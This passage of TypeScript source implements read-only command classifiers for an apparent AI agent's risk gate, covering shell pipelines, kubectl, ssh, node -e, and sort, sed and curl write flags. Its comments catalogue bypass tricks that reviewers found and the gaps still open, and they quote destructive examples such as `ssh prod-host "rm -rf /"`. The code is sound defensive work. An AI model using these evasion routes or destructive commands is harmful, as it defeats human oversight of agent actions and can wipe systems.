 * writing requires a write-bin (not on the conservative allowlist), a
 * redirection, or a command substitution, all of which are still refused
 * before the split. Everything except a single `|` is rejected up front:
 * `;`, `&` (and thus `&&`, `|&`, background `&`), `<`, `>`, backtick, and
 * `$(`. `||` (logical OR) and a leading/trailing/doubled pipe surface as
 * an empty stage and are refused. Each stage is then handed to the strict
 * `isReadOnlyBashCommand`, so the per-bin write-flag guards (`find`,
 * `sort`, `tree`, `file`) and the `command`/`env` runner recursion all
 * still apply per stage.
 */
export function isReadOnlyBashPipeline(command: string): boolean {
  const trimmed = command.trim();
  if (trimmed === "") return false;

  // Reject everything the single-command classifier rejects EXCEPT a
  // single `|`. Keeping `&` in the reject set also kills `&&`, `|&`, and a
  // backgrounding `&`; redirection and substitution stay refused. After
  // this, the only metacharacter that can remain is `|`.
  if (/[;&<>]/.test(trimmed)) return false;
  if (trimmed.includes("\n")) return false;
  if (trimmed.includes("`")) return false;
  if (trimmed.includes("$(")) return false;

  // Split on the pipe and require every stage to be a non-empty, provably
  // read-only command. An empty stage means `||`, a leading/trailing pipe,
  // or `| |` — all refused. A single command (no pipe) yields one stage and
  // is classified exactly as `isReadOnlyBashCommand` would.
  return trimmed.split("|").every((stage) => {
    const s = stage.trim();
    if (s === "") return false;
    return isReadOnlyBashCommand(s);
  });
}

// Kubectl read-only VERB floor — used ONLY by the Risk Classifier's
// built-in floor (`risk-classifier.ts`), never by `isReadOnlyBashCommand`
// / `isReadOnlyBashPipeline` above. Task da823721 (blast-radius decision,
// verb list, secrets/configmap exclusion, and the fail-safe rationale
// for each: all recorded in docs/risk-gate.md's "Kubectl read-only verb
// floor" section — this is the single source of truth for the scope,
// keep it there rather than duplicating it here).
//
// Design: two ALLOWLISTS, not a metacharacter denylist. Round 1 and
// round 2 of this task each patched one more shell-metacharacter
// bypass onto a substring/decode-based exclusion (`$`-expansion,
// quoting, escaping); round-2 review then found brace expansion
// (`s{e..e}cret`), glob patterns (`s*`, `sec[r]et`), and endpoint
// redirection (`--server`/`-s`/`--kubeconfig`) still slipping through,
// because the fix kept adding exclusions for the metacharacter of the
// week instead of closing the class. The halt decision from that round
// was to stop enumerating metacharacters and redesign to allowlists:
// (1) every token after `kubectl` must match a plain-word shape — no
// quotes, backslashes, `$`, backticks, braces, globs, or any other
// shell-special character survives that check, which is what actually
// closes the brace/glob/quote/escape class at once instead of one
// pattern at a time; (2) every flag token must be an explicitly named,
// known-read flag for its verb (or a known global flag) — which is
// what closes the endpoint-redirection class (`--server`, `-s`,
// `--kubeconfig`, `--token`, `--as`, ... are simply never allowlisted,
// pre- or post-verb) and the file/kustomize-driven resource-selection
// class (`-f`/`--filename`/`-k`/`--kustomize` are not in any verb's
// allowlist) and the `--raw` arbitrary-endpoint class (`--raw` is not
// in any verb's allowlist either) in the same pass. Invariant:
// `isReadOnlyKubectlCommand` returns `true` only for a curated read
// verb, every token argv-shaped as a plain word, every flag drawn from
// that verb's explicit allowlist, and no secret/configmap resource
// mention; every other shape fails closed to `false`.
const KUBECTL_READ_ONLY_VERBS: ReadonlySet<string> = new Set([
  "get", "describe", "logs", "top",
  "api-resources", "api-versions", "version", "cluster-info", "explain",
]);

// Verbs whose resource argument can materialize live Secret or
// ConfigMap data.
const KUBECTL_SENSITIVE_RESOURCE_VERBS: ReadonlySet<string> = new Set(["get", "describe"]);

// Token shape allowlist. Every token after `kubectl` must match this:
// letters, digits, and `_ . : / = , @ % + -`. That excludes quotes,
// backslashes, `$`, backticks, `{`/`}` (brace expansion), `*`/`?`/`[`/`]`
// (globs), `~`, `!`, `#`, `&`, `;`, `|`, `<`, `>`, `(`, `)`, and spaces
// (embedded via quoting). A token that fails this never reaches the
// verb or flag checks below: fail-closed on shape alone. This also
// makes decoding quoted/escaped forms of "secret" or "configmap"
// unnecessary — a quoted or escaped token simply never matches this
// pattern in the first place, so the resource-mention checks below only
// ever need to look at the raw token.
const KUBECTL_PLAIN_WORD_PATTERN = /^[A-Za-z0-9_.:/=,@%+-]+$/;

// Global flags, allowed before OR after the verb. Only the ones in
// `KUBECTL_GLOBAL_VALUE_FLAGS` consume a following token as their value
// (in the `--flag value` form; `--flag=value` never consumes a
// following token). Deliberately excludes every flag that names an
// alternate endpoint or identity — `--server`, `-s`, `--kubeconfig`,
// `--token`, `--as`, `--as-group`, `--user`, `--cluster`,
// `--tls-server-name`, `--insecure-skip-tls-verify` — so none of them
// can ever float credentials or requests to a caller-chosen host
// through this floor, no matter whether they appear before or after
// the verb.
const KUBECTL_GLOBAL_ALLOWED_FLAGS: ReadonlySet<string> = new Set([
  "--context", "--namespace", "-n", "--request-timeout", "-v", "--v",
  "--all-namespaces", "-A",
]);
const KUBECTL_GLOBAL_VALUE_FLAGS: ReadonlySet<string> = new Set([
  "--context", "--namespace", "-n", "--request-timeout", "-v", "--v",
]);

// Per-verb read-flag allowlists. `*_VALUE` is the subset that consumes
// a following token as its value in the `--flag value` form; every
// other allowed flag is boolean (never consumes a following token).
// `--raw` (arbitrary API server path) and the file/kustomize-driven
// resource selectors `--filename`/`-k`/`--kustomize` (this module
// cannot see what a manifest file or kustomization directory names, so
// it cannot prove the selected resource is not a Secret or ConfigMap)
// are deliberately absent from every verb's allowlist below — that
// omission is the enforcement mechanism, not a separate check. `-f` is
// allowlisted for `logs` ONLY, where it means --follow; on `get` and
// `describe` it is the file selector and is deliberately absent.
// Every `*_VALUE` member must be a pflag flag with an empty NoOptDefVal
// (it always consumes the next argv element): if upstream ever turns
// one of them into a boolean-with-default, the following token stops
// being consumed by kubectl and must be re-validated here.
const KUBECTL_GET_ALLOWED_FLAGS: ReadonlySet<string> = new Set([
  "-o", "--output", "-l", "--selector", "--field-selector", "-w", "--watch",
  "--watch-only", "--show-labels", "--no-headers", "--sort-by", "--show-kind",
  "--label-columns", "-L", "--chunk-size", "--ignore-not-found",
]);
const KUBECTL_GET_VALUE_FLAGS: ReadonlySet<string> = new Set([
  "-o", "--output", "-l", "--selector", "--field-selector", "--sort-by",
  "--label-columns", "-L", "--chunk-size",
]);

const KUBECTL_DESCRIBE_ALLOWED_FLAGS: ReadonlySet<string> = new Set([
  "-l", "--selector", "--show-events",
]);
const KUBECTL_DESCRIBE_VALUE_FLAGS: ReadonlySet<string> = new Set(["-l", "--selector"]);

const KUBECTL_LOGS_ALLOWED_FLAGS: ReadonlySet<string> = new Set([
  "-f", "--follow", "-c", "--container", "--all-containers", "--tail", "--since",
  "--since-time", "--timestamps", "-p", "--previous", "--limit-bytes", "--prefix",
  "-l", "--selector", "--max-log-requests",
]);
const KUBECTL_LOGS_VALUE_FLAGS: ReadonlySet<string> = new Set([
  "-c", "--container", "--tail", "--since", "--since-time", "--limit-bytes",
  "-l", "--selector", "--max-log-requests",
]);

const KUBECTL_TOP_ALLOWED_FLAGS: ReadonlySet<string> = new Set([
  "--containers", "--sort-by", "-l", "--selector", "--no-headers",
  "--use-protocol-buffers",
]);
const KUBECTL_TOP_VALUE_FLAGS: ReadonlySet<string> = new Set(["--sort-by", "-l", "--selector"]);

// Shared by the informational verbs: api-resources, api-versions,
// version, cluster-info, explain, and `auth can-i`.
const KUBECTL_INFO_ALLOWED_FLAGS: ReadonlySet<string> = new Set([
  "-o", "--output", "--namespaced", "--verbs", "--api-group", "--sort-by",
  "--recursive", "--list", "-A", "--all-namespaces", "--client", "--short",
]);
const KUBECTL_INFO_VALUE_FLAGS: ReadonlySet<string> = new Set([
  "-o", "--output", "--verbs", "--api-group", "--sort-by",
]);

/** True when any raw token mentions "secret" (case-insensitive substring). */
function kubectlArgMentionsSecret(tokens: readonly string[]): boolean {
  return tokens.some((t) => t.toLowerCase().includes("secret"));
}

/**
 * True when any raw token mentions "configmap", or is (or contains, as
 * one comma-separated resource-list segment) the bare abbreviation
 * `cm` — `get cm`, `get cm/my-map`, `get pods,cm`, `get cm,pods` are
 * all caught. ConfigMap data is a common credential store (see
 * docs/risk-gate.md), so it gets the same fail-safe exclusion as
 * Secrets. The `cm` check is segment-based rather than a bare substring
 * match so it does not fire on an unrelated word that merely starts or
 * ends with "cm" (`cmd`, `cmagent`).
 */
function kubectlArgMentionsConfigMap(tokens: readonly string[]): boolean {
  return tokens.some((t) => {
    const lower = t.toLowerCase();
    if (lower.includes("configmap")) return true;
    return lower.split(",").some((seg) => seg === "cm" || seg.startsWith("cm/"));
  });
}

/**
 * Kubectl read-only floor for the Risk Classifier ONLY — see the module
 * doc above this constant block for scope and the blast-radius
 * decision. `true` means every token after `kubectl` is argv-shaped as
 * a plain word, a curated read verb was invoked, every flag is drawn
 * from that verb's (or the global) allowlist, and — for `get`/
 * `describe` — no token mentions a Secret or ConfigMap resource, with
 * no shell chaining, redirection, or substitution anywhere in the
 * command.
 */
export function isReadOnlyKubectlCommand(command: string): boolean {
  const trimmed = command.trim();
  if (trimmed === "") return false;
  if (hasUnsafeShellMetachar(trimmed)) return false;

  const tokens = trimmed.split(/\s+/);
  if (tokens[0] !== "kubectl") return false;

  const rest = tokens.slice(1);

  // Token shape allowlist: every token after `kubectl` must be a plain
  // word (see the constant doc above). Closes brace expansion, globs,
  // quoting, and escaping in one check, before any verb or flag logic
  // runs.
  if (rest.some((t) => !KUBECTL_PLAIN_WORD_PATTERN.test(t))) return false;

  // Walk any leading global flags to find the verb. An unrecognized
  // flag here fails closed immediately — a token starting with `-`
  // can never itself be the verb.
  let idx = 0;
  while (idx < rest.length) {
    const t = rest[idx];
    if (t === undefined || !t.startsWith("-")) break;
    const eq = t.indexOf("=");
    const flagName = eq === -1 ? t : t.slice(0, eq);
    if (!KUBECTL_GLOBAL_ALLOWED_FLAGS.has(flagName)) return false;
    idx += 1;
    if (eq === -1 && KUBECTL_GLOBAL_VALUE_FLAGS.has(flagName)) {
      if (idx >= rest.length) return false; // missing value: fail closed
      idx += 1;
    }
  }

  const sub = rest[idx];
  if (sub === undefined) return false; // bare `kubectl` or only global flags
  idx += 1;

  let verbAllowedFlags: ReadonlySet<string>;
  let verbValueFlags: ReadonlySet<string>;
  // `auth can-i` is a permission CHECK, never the resource's own data,
  // so it is deliberately excluded from `KUBECTL_SENSITIVE_RESOURCE_VERBS`
  // (that Set only ever names `get`/`describe`) and this lookup returns
  // `false` for it without a separate branch.
  const sensitiveVerb = KUBECTL_SENSITIVE_RESOURCE_VERBS.has(sub);

  if (sub === "auth") {
    if (rest[idx] !== "can-i") return false;
    idx += 1;
    verbAllowedFlags = KUBECTL_INFO_ALLOWED_FLAGS;
    verbValueFlags = KUBECTL_INFO_VALUE_FLAGS;
  } else if (!KUBECTL_READ_ONLY_VERBS.has(sub)) {
    return false;
  } else {
    switch (sub) {
      case "get":
        verbAllowedFlags = KUBECTL_GET_ALLOWED_FLAGS;
        verbValueFlags = KUBECTL_GET_VALUE_FLAGS;
        break;
      case "describe":
        verbAllowedFlags = KUBECTL_DESCRIBE_ALLOWED_FLAGS;
        verbValueFlags = KUBECTL_DESCRIBE_VALUE_FLAGS;
        break;
      case "logs":
        verbAllowedFlags = KUBECTL_LOGS_ALLOWED_FLAGS;
        verbValueFlags = KUBECTL_LOGS_VALUE_FLAGS;
        break;
      case "top":
        verbAllowedFlags = KUBECTL_TOP_ALLOWED_FLAGS;
        verbValueFlags = KUBECTL_TOP_VALUE_FLAGS;
        break;
      default: // api-resources, api-versions, version, cluster-info, explain
        verbAllowedFlags = KUBECTL_INFO_ALLOWED_FLAGS;
        verbValueFlags = KUBECTL_INFO_VALUE_FLAGS;
    }
  }

  const remainder = rest.slice(idx);

  // Validate every remaining flag token against the combined global +
  // per-verb allowlist (global flags are legal both before and after
  // the verb). Positional tokens (resource names, selector values
  // already consumed as a flag's value) are not re-validated here —
  // they were already checked against the plain-word pattern above.
  for (let i = 0; i < remainder.length; i++) {
    const t = remainder[i];
    if (t === undefined) continue;
    if (!t.startsWith("-")) {
      // `cluster-info` takes no positional: `cluster-info dump` prints
      // cluster-wide pod logs and is refused (fail-safe), as is any
      // future sub-subcommand. Every other verb's positionals were
      // already shape-checked above.
      if (sub === "cluster-info") return false;
      continue;
    }
    const eq = t.indexOf("=");
    const flagName = eq === -1 ? t : t.slice(0, eq);
    const isGlobal = KUBECTL_GLOBAL_ALLOWED_FLAGS.has(flagName);
    const isVerbFlag = verbAllowedFlags.has(flagName);
    if (!isGlobal && !isVerbFlag) return false;
    if (eq === -1) {
      const takesValue =
        (isGlobal && KUBECTL_GLOBAL_VALUE_FLAGS.has(flagName)) ||
        (isVerbFlag && verbValueFlags.has(flagName));
      if (takesValue) {
        i += 1;
        if (i >= remainder.length) return false; // missing value: fail closed
      }
    }
  }

  if (
    sensitiveVerb &&
    (kubectlArgMentionsSecret(remainder) || kubectlArgMentionsConfigMap(remainder))
  ) {
    return false;
  }

  return true;
}

// `ssh` / `node -e` local-head-only floors — used ONLY by the Risk
// Classifier's built-in floor (`risk-classifier.ts`), NEVER by
// `isReadOnlyBashCommand` / `isReadOnlyBashPipeline` above, same
// scoping precedent as `isReadOnlyKubectlCommand` (see that block's own
// header): the understanding-gate PreToolUse blocker and the
// solution-acceptance write-guard both consume `isReadOnlyBashCommand`
// directly and MUST keep treating `ssh` and `node -e` as non-read-only
// — those two gates exist to block an unreviewed WRITE, and both `ssh
// <host> <cmd>` and `node -e <code>` can trivially write. Folding
// either into the general allowlist would silently widen what those
// gates let through, well past this task's (2929c5b7) scope.
//
// Both floors are a DELIBERATE, DISCLOSED risk-acceptance for the Risk
// Gate specifically, not a claim that the action is actually read-only:
//
//   - `ssh <host> <cmd>`: classified by the LOCAL head token (`ssh`)
//     ONLY. The remote command is NOT inspected — `ssh prod-host "rm -rf
//     /"` floors to `low` exactly like `ssh prod-host "cat /etc/hosts"`
//     does. This is the honest boundary the task explicitly asked for:
//     the Risk Gate reasons about the LOCAL shell command it can see,
//     and a quoted remote payload is opaque to it by construction (the
//     same reason `node -e`'s arbitrary code is out of scope below).
//     Still fail-safe on the LOCAL side: any shell metacharacter, chain,
//     or substitution in the outer command (`ssh host "x"; rm -rf /`)
//     is refused up front by `hasUnsafeShellMetachar`, same as every
//     other floor in this module, so a local write cannot be laundered
//     behind the `ssh` head either.
//   - `node -e <code>` / `node --eval <code>`: the code argument is
//     arbitrary and unexamined. Justified narrowly: the Risk Gate's
//     `gate-prod-destructive(-approval)` policies exist to catch
//     production-DESTRUCTIVE shell actions, not to be a code-execution
//     sandbox — an agent that can run `node -e` can already run
//     equivalent JS via a script file, `python3 -c`, etc., none of
//     which this floor (or the general read-only floor) claims to
//     police. Flooring it here removes the specific friction the task
//     names (`node -e` denied by the fail-closed unclassified rule
//     while investigating, not while mutating).
//
// Neither floor is folded into `SIMPLE_READ_ONLY_BINS` or the per-bin
// guards above for exactly this reason: both are Risk-Gate-only,
// intentional exceptions to "provably read-only", not new entries in
// that provable set.
const SSH_TOKEN_RE = /(^|\/)ssh$/;
const NODE_TOKEN_RE = /(^|\/)node$/;

/**
 * Risk Classifier floor for `ssh`. `true` when the head token
 * basename-matches `ssh` (any path prefix) and the whole command has no
 * shell metacharacter — see the block header above for the LOCAL-HEAD-
 * ONLY boundary. Every token after `ssh` (host, flags, and the quoted
 * remote command) is accepted unconditionally; the remote side is
 * never inspected.
 */
export function isReadOnlySshRiskFloor(command: string): boolean {
  const trimmed = command.trim();
  if (trimmed === "") return false;
  if (hasUnsafeShellMetachar(trimmed)) return false;
  const tokens = trimmed.split(/\s+/);
  return SSH_TOKEN_RE.test(tokens[0] ?? "");
}

/**
 * Risk Classifier floor for `node -e` / `node --eval`. `true` when the
 * head token basename-matches `node` (any path prefix), the whole
 * command has no shell metacharacter, and `-e` / `--eval` /
 * `--eval=...` appears anywhere in the argv — see the block header
 * above for the arbitrary-code boundary. The code argument itself is
 * never inspected. A bare `node script.js` (no `-e`/`--eval`) does NOT
 * match: this floor is scoped to the literal eval flags the task named,
 * not to every node invocation.
 */
export function isReadOnlyNodeEvalRiskFloor(command: string): boolean {
  const trimmed = command.trim();
  if (trimmed === "") return false;
  if (hasUnsafeShellMetachar(trimmed)) return false;
  const tokens = trimmed.split(/\s+/);
  if (!NODE_TOKEN_RE.test(tokens[0] ?? "")) return false;
  return tokens
    .slice(1)
    .some((t) => t === "-e" || t === "--eval" || t.startsWith("--eval="));
}

/**
 * Returns true when `t` (with any trailing `=VALUE` glue stripped) is a
 * GNU/BSD `getopt_long` ABBREVIATION of `fullFlag`: a prefix (including
 * the full spelling) of `fullFlag`, at least `minPrefixLen` characters
 * past the leading `--`.
 * `getopt_long` accepts ANY prefix of a long option name that resolves
 * unambiguously against the rest of that binary's option table (`sort
 * --out=x` runs as `--output=x`) — see the per-call-site comments below
 * for the measured minimum (task dd055c1d, this run: BSD sort on macOS
 * 26 `/usr/bin/sort`, GNU coreutils sort 9.11 via Homebrew `gsort`, and
 * `file` 5.41 `/usr/bin/file`; all measured with the created artefact —
 * an output file, a temp file, or a canary touched by an executed
 * `--compress-program` — as ground truth, not the exit code).
 *
 * Per the module's fail-closed contract (spec dd055c1d): rebuilding the
 * FULL ambiguity table (which prefixes collide with every OTHER long
 * option the binary happens to have) is deliberately NOT attempted.
 * Instead this is a TRUE prefix test against one named flag, gated at
 * the measured minimum length — a length shorter than that measured
 * minimum was observed "ambiguous" (rejected, not executed) on at least
 * one of the binaries tested, so treating it as a write would be
 * speculative, not conservative. A true-prefix test can never fire on
 * an unrelated option: two different flags' names diverge at some
 * character, and the shorter one stops matching there (`--che` is not a
 * prefix of `--compile`, `--k` is not a prefix of `--output`), so this
 * cannot spuriously catch an abbreviation of a different, benign flag —
 * confirmed for every write flag this fix guards (no other long option
 * on any measured binary shares a prefix at or past the measured
 * minimum).
 */
function isLongOptionAbbreviation(t: string, fullFlag: string, minPrefixLen: number): boolean {
  const eq = t.indexOf("=");
  const name = eq === -1 ? t : t.slice(0, eq);
  if (name.length < 2 + minPrefixLen) return false;
  return fullFlag.startsWith(name);
}

/**
 * Returns true when a token is the output-redirect write flag shared by
 * `sort` and `tree`: `-o` / `--output`, INCLUDING an unambiguous
 * abbreviation of the long form (`--o`, `--ou`, `--out`, ... — measured
 * minimum 1 character past `--`, both BSD and GNU sort, task dd055c1d).
 * Cluster detection: in a cluster like `-rno`, getopt assigns the
 * cluster remainder (or the next argv token when nothing follows within
 * the cluster) as the output-file path, so any short cluster containing
 * lowercase `o` after the leading dash is a write vector. Conservative:
 * a filename token like `foo.txt` does not start with `-` and is
 * therefore never matched.
 *
 * `tree` itself was measured (GNU tree 2.3.2 via Homebrew) to accept NO
 * abbreviation of ANY of its long options at all — `--opt-toggle` works,
 * `--opt` errors `Invalid argument` — so `-o`/`--output` has no long
 * form and no abbreviation vector on tree either way; the abbreviation
 * branch added here is inert-but-harmless for tree and load-bearing for
 * sort, which shares this function via `isTreeWriteToken`'s delegation.
 */
function isOutputWriteToken(raw: string): boolean {
  // Monotone BY CONSTRUCTION (review round 1, decision D3): testing
  // raw OR decoded means decoding can only ADD a match, never remove
  // one. The earlier shape (test the decoded value alone) was measured
  // to LOSE matches here, because these predicates exclude `--` by
  // construction and a token like `-"-out"=x` decodes out of the
  // cluster branch entirely.
  return checkOutputWrite(raw) || checkOutputWrite(decodeShellWord(raw));
}

function checkOutputWrite(t: string): boolean {
  // Exact `--output` and any unambiguous abbreviation of it
  // (`--o`..`--outpu`), glued (`=VALUE`) or bare. See
  // `isLongOptionAbbreviation` for the measured minimum (1 char past
  // `--`) and why a true-prefix test cannot catch an unrelated flag.
  if (isLongOptionAbbreviation(t, "--output", 1)) return true;
  // Short flag or cluster: single leading '-' (not '--'), containing
  // lowercase 'o'. Catches -o, -oFILE, -no, -rno, -rnofoo, etc.
  return t.startsWith("-") && !t.startsWith("--") && t.slice(1).includes("o");
}

/**
 * Returns true when a token is a write flag for `tree`. tree's only
 * file-writing vector is the output redirect `-o` / `--output`; it has
 * no exec or temp-dir flags, so this delegates to `isOutputWriteToken`.
 *
 * Quoted-spelling family (task fdee7d0f): NOT MEASURED against a real
 * `tree` at the time — the binary was not installed on that machine, so
 * the quoted-spelling family could only be confirmed for `find`, `sort`
 * and `file`. That fix was applied here on the same reasoning, without
 * direct tree confirmation.
 *
 * Long-option ABBREVIATION family (task dd055c1d): NOW MEASURED, GNU
 * tree 2.3.2 (Homebrew). Result: tree's argument parser accepts NO
 * abbreviation of ANY long option — `--opt-toggle` (a real tree option)
 * works verbatim, but `--opt`, a genuine prefix of it, errors `Invalid
 * argument`. tree also has no long spelling of `-o` at all (`--o`,
 * `--out`, `--output` all error the same way — checked directly, not
 * inferred). So the abbreviation branch `isOutputWriteToken` now carries
 * is inert for tree: no real tree invocation can reach it, because tree
 * rejects every abbreviated long flag outright, before this classifier
 * is ever consulted. It stays wired through the shared function anyway,
 * both because sort needs it and because a future tree release adding
 * `getopt_long`-style abbreviation would then be covered for free.
 */
function isTreeWriteToken(raw: string): boolean {
  // Pass the RAW token through: isOutputWriteToken owns the single decode.
  // Decoding here too would decode TWICE, and decode(decode(x)) goes past
  // bash whenever the first pass leaves a quote behind (`-"'o'"` -> `-'o'`
  // -> `-o`).
  //
  // Measured honestly: since the guards became raw-OR-decoded, re-adding
  // the second decode no longer changes any classification I could find —
  // the raw arm already matches `-"'o'"` (it starts with one `-` and
  // contains `o`). A mutation restoring the double decode leaves the suite
  // green, and that is the structural fix absorbing the mistake rather than
  // a gap in the tests. Single-decode stays because it is what bash does;
  // do not rely on the raw arm to keep covering for it.
  return isOutputWriteToken(raw);
}

/**
 * Returns true when a token is a write OR exec flag for `sort`.
 *
 * sort's write surface is larger than output redirection, and the guard
 * MUST enumerate all of it, not just `-o`. An output-only guard silently
 * laundered `--compress-program`, which makes sort spawn an arbitrary
 * program on its spill temp files (an arbitrary-code-execution vector
 * with no shell metacharacter). The vectors:
 *   - output:     `-o` / `--output` (see `isOutputWriteToken`).
 *   - exec:       `--compress-program=PROG` runs PROG on spill files.
 *   - temp write: `--temporary-directory=DIR` / `-T DIR` writes scratch
 *                 files to a caller-chosen path.
 * Short `-T` is detected like `-o`: any short cluster containing `o`
 * (output) or uppercase `T` (temp dir) is a write vector. This can
 * over-block a few benign size values (e.g. `-S2T`); over-blocking a
 * read is acceptable, under-blocking a write is not.
 *
 * Each long-form vector also matches an unambiguous GNU/BSD
 * `getopt_long` ABBREVIATION of its full spelling, not just the exact
 * word (task dd055c1d): `sort --out=x`, `--o=x`, and `--outp=x` were all
 * measured writing their output file on both BSD sort (macOS) and GNU
 * coreutils sort 9.11 (`gsort`) while the pre-fix guard compared only
 * the full `--output` spelling. Measured minimums (both variants agree):
 * `--o` for `--output` (1 char), `--co` for `--compress-program` (2
 * chars — `--c` alone is ambiguous with `--check` on both binaries and
 * errors rather than running), `--t` for `--temporary-directory` (1
 * char). See `isLongOptionAbbreviation`.
 */
function isSortWriteToken(raw: string): boolean {
  // Monotone BY CONSTRUCTION (review round 1, decision D3): testing
  // raw OR decoded means decoding can only ADD a match, never remove
  // one. The earlier shape (test the decoded value alone) was measured
  // to LOSE matches here, because these predicates exclude `--` by
  // construction and a token like `-"-out"=x` decodes out of the
  // cluster branch entirely.
  return checkSortWrite(raw) || checkSortWrite(decodeShellWord(raw));
}

function checkSortWrite(t: string): boolean {
  // Exact spellings and unambiguous abbreviations (measured minimums:
  // `--co`, `--t`, `--o` — see `isSortWriteToken`'s docstring and
  // `isLongOptionAbbreviation`).
  if (isLongOptionAbbreviation(t, "--compress-program", 2)) return true;
  if (isLongOptionAbbreviation(t, "--temporary-directory", 1)) return true;
  if (isLongOptionAbbreviation(t, "--output", 1)) return true;
  // Short flag or cluster: '-' (not '--') containing 'o' (output) or
  // uppercase 'T' (temp dir).
  return t.startsWith("-") && !t.startsWith("--") && /[oT]/.test(t.slice(1));
}

/**
 * Returns true when a token is a write flag for `file`.
 * `-C` / `--compile` writes a compiled magic-cache file (`<name>.mgc`).
 * Lowercase `-c` checks the magic file without writing; only uppercase
 * `C` triggers a write. Cluster detection: `-bC`, `-Cb`, and `-bCx`
 * all contain uppercase `C` after the leading dash and are write vectors.
 *
 * Also matches an unambiguous GNU `getopt_long` ABBREVIATION of
 * `--compile` (task dd055c1d): `file --co`/`--com`/... were measured
 * creating the compiled magic-cache file (macOS `/usr/bin/file` 5.41)
 * while the pre-fix guard compared only the exact `--compile` spelling.
 * Measured minimum is `--co` (2 chars) — `--c` alone is ambiguous with
 * `--checking-printout` and errors rather than running; `--che`, the
 * shortest unambiguous abbreviation of `--checking-printout` (a
 * read-only flag), is NOT a prefix of `--compile` and so is unaffected
 * (measured: `file --che` does not create the cache file). See
 * `isLongOptionAbbreviation`.
 */
function isFileWriteToken(raw: string): boolean {
  // Monotone BY CONSTRUCTION (review round 1, decision D3): testing
  // raw OR decoded means decoding can only ADD a match, never remove
  // one. The earlier shape (test the decoded value alone) was measured
  // to LOSE matches here, because these predicates exclude `--` by
  // construction and a token like `-"-out"=x` decodes out of the
  // cluster branch entirely.
  return checkFileWrite(raw) || checkFileWrite(decodeShellWord(raw));
}

function checkFileWrite(t: string): boolean {
  // Exact `--compile` and any unambiguous abbreviation of it (`--co`..
  // `--compil`) — see this function's docstring and
  // `isLongOptionAbbreviation`.
  if (isLongOptionAbbreviation(t, "--compile", 2)) return true;
  // Short flag or cluster: single leading '-' (not '--'), containing
  // uppercase 'C'. Lowercase 'c' is intentionally not matched.
  return t.startsWith("-") && !t.startsWith("--") && t.slice(1).includes("C");
}

/**
 * Returns true when a token is the in-place-edit write flag for `sed`
 * (task 2929c5b7): `-i`, GNU's optional glued suffix form (`-i.bak`,
 * `-ibak`), or the GNU long form `--in-place` / `--in-place=SUFFIX`.
 * Without `-i`, sed only ever writes its result to stdout — it cannot
 * mutate a file — so every other sed invocation is read-only.
 *
 * Deliberately conservative, NOT abbreviation-aware or cluster-value-
 * aware like `sort`/`file`'s guards above (no getopt measurement was
 * done for GNU vs. BSD sed here — a documented simplification, see
 * docs/risk-gate.md): any short token starting with a single `-` that
 * contains the letter `i` anywhere forfeits the floor, including a
 * combined cluster (`-ni` = quiet + in-place, a real, common idiom) and
 * a token whose OWN glued script text happens to contain the letter
 * `i` (e.g. `-e's/is/isnt/'`). The latter is a known, accepted false
 * positive: "over-blocking a read is acceptable, under-blocking a
 * write is not" (the same design rule `sort`'s guard states above) —
 * a positional script operand (no leading `-`) is unaffected either
 * way, so `sed -n '/is/p' file` still floors.
 */
function isSedWriteToken(raw: string): boolean {
  return checkSedWrite(raw) || checkSedWrite(decodeShellWord(raw));
}

function checkSedWrite(t: string): boolean {
  if (t === "--in-place" || t.startsWith("--in-place=")) return true;
  return t.startsWith("-") && !t.startsWith("--") && t.slice(1).includes("i");
}

/**
 * curl write/method vectors (task 2929c5b7): a curated, DISCLOSED-
 * boundary flag list, not a full measured audit like the git/sort/file
 * guards above. Forfeits the read-only floor when:
 *   - `-d` / `--data` / `--data-raw` / `--data-binary` /
 *     `--data-urlencode` / `--data-ascii` / `--json` / `-F` /
 *     `--form` / `--form-string` / `-T` / `--upload-file` appears
 *     (each sends a request body — a POST/PUT by curl's own default
 *     the moment any of them is present, even without an explicit
 *     `-X`), exact or glued short form (`-dPAYLOAD`, `-T@file`);
 *   - `-X` / `--request` names a method other than `GET`/`HEAD`
 *     (case-sensitive on the method value; `-X`/`--request` with NO
 *     value, or an unrecognized/lowercase spelling, fails closed —
 *     treated as a forfeit, not as GET).
 * Known, disclosed gaps (a curl invocation that reaches one of these
 * WITHOUT tripping this guard): `-K` / `--config` reads flags —
 * including `-X`/`-d` — from an operator-named file this token scan
 * never opens (the same class of evasion `npm`'s `--registry` guard
 * above closes for npm specifically; curl's `-K` is not closed here).
 * `--data-@file` / `-d @file` (data FROM a file) is still caught by
 * the plain `-d`/`--data` match; the guard does not need to look at
 * `@` — presence of the flag is what matters, not its argument shape.
 */
const CURL_DATA_LONG_FLAGS: ReadonlySet<string> = new Set([
  "--data",
  "--data-raw",
  "--data-binary",
  "--data-urlencode",
  "--data-ascii",
  "--json",
  "--form",
  "--form-string",
  "--upload-file",
]);
const CURL_DATA_SHORT_FLAG_CHARS: ReadonlySet<string> = new Set(["d", "F", "T"]);

function isCurlWriteToken(raw: string): boolean {
  return checkCurlWrite(raw) || checkCurlWrite(decodeShellWord(raw));
}

function checkCurlWrite(t: string): boolean {
  if (t.startsWith("--")) {
    const base = t.split("=")[0]!;
    return CURL_DATA_LONG_FLAGS.has(base);
  }
  if (t.startsWith("-") && t.length > 1) {
    return CURL_DATA_SHORT_FLAG_CHARS.has(t[1]!);
  }
  return false;
}

/**
 * True when `tokens` (the argv AFTER `curl`) names an HTTP method other
 * than GET/HEAD via `-X <METHOD>` / `-X<METHOD>` / `--request <METHOD>`
 * / `--request=<METHOD>`. `-X`/`--request` with no following value at
 * all fails closed (forfeits read-only) rather than being treated as a
 * no-op.
 */
function curlMethodForfeits(tokens: readonly string[]): boolean {
  for (let i = 0; i < tokens.length; i += 1) {
    const raw = tokens[i]!;
    const t = decodeShellWord(raw) === raw ? raw : decodeShellWord(raw);
    let value: string | undefined;
    if (t === "-X" || t === "--request") {
      value = tokens[i + 1] === undefined ? undefined : decodeShellWord(tokens[i + 1]!);
      if (value === undefined) return true;
    } else if (t.startsWith("-X") && t.length > 2 && !t.startsWith("--")) {
      value = t.slice(2);
    } else if (t.startsWith("--request=")) {
      value = t.slice("--request=".length);
    } else {
      continue;
    }
    const method = value.toUpperCase();
    if (method !== "GET" && method !== "HEAD") return true;
  }
  return false;
}

/**
 * Returns true when a curl invocation (argv AFTER `curl`) is provably
 * read-only: no data/upload/form flag present (`isCurlWriteToken`), and
 * no `-X`/`--request` method other than GET/HEAD (`curlMethodForfeits`).
 */
function isReadOnlyCurlInvocation(tokens: readonly string[]): boolean {
  if (tokens.some(isCurlWriteToken)) return false;
